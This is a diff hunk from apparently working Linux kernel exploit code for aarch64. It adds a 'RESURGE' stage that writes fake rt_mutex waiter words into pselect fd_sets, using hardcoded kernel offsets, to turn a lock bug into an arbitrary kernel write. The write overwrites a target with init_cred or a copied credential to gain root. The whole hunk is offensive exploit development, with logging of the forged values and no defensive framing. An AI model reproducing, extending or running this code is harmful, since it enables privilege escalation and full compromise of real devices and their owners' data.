@@ -1972,6 +1972,54 @@ void do_pselect_fake_lock_route(void) {
     fd_set ex;
     prepare_pselect_fdsets(&in, &out, &ex);
     /*
+     * RESURGE fdset override (GhostLockAdapt port): bypass the stamp
+     * chains entirely — write the exact waiter words for the current
+     * stage directly into the fdsets. settle = all-benign (re-link);
+     * write = only-right (parent=target-8, child=value, rotating lock).
+     */
+    if (g_resurge_stage) {
+      uint64_t bt_off =
+          (active_offsets && active_offsets->off_bss_tail_lock)
+              ? (uint64_t)active_offsets->off_bss_tail_lock
+              : 0x02BB9D00ULL;
+      uint64_t dead_task = data_addr(KIMAGE_TEXT_BASE + bt_off + 0x1000);
+      uint64_t wlock = data_addr(KIMAGE_TEXT_BASE + bt_off);
+      uint64_t w0 = 0, w1 = 0, w2 = 0;
+      if (g_resurge_stage == 2) {
+        uint64_t ztgt = (uint64_t)pselect_write_target();
+        uint64_t ic_off =
+            (active_offsets && active_offsets->off_init_cred)
+                ? (uint64_t)active_offsets->off_init_cred
+                : 0x027E0BE0ULL;
+        uint64_t val = g_cred_copy ? (uint64_t)g_cred_copy
+                                   : (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                                                         ic_off);
+        w0 = (ztgt - 8) & ~3ULL; /* red parent = target-8 */
+        w1 = val;                 /* right child = VALUE (the write) */
+        w2 = 0;
+        wlock = data_addr(KIMAGE_TEXT_BASE + bt_off +
+                          (uint64_t)(g_resurge_rot ? g_resurge_rot : 1) * 8);
+        pr_info("RESURGE fdset WRITE rot=%d w0=%016llx w1=%016llx "
+                "lock2=%016llx\n",
+                g_resurge_rot, (unsigned long long)w0,
+                (unsigned long long)w1, (unsigned long long)wlock);
+      } else {
+        pr_info("RESURGE fdset SETTLE all-benign lock=%016llx\n",
+                (unsigned long long)wlock);
+      }
+      int wps = pselect_words_per_set();
+      pselect_put_waiter_word(&in, &out, &ex, wps, 0, w0, "r0");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 1, w1, "r1");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 2, w2, "r2");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 3, 0, "r3");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 4, 0, "r4");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 5, 0, "r5");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 6, dead_task, "rtask");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 7, wlock, "rlock");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 8, 0, "rprio");
+      pselect_put_waiter_word(&in, &out, &ex, wps, 9, 0, "rdl");
+    }
+    /*
      * Placement audit (nfds=320 → words_per_set=5 on aarch64):
      * shift + waiter_word → set/index. With default shift=-2:
      *   tree@w2→in[0], pi@w5→in[3], task@w8→out[1], lock@w9→out[2]
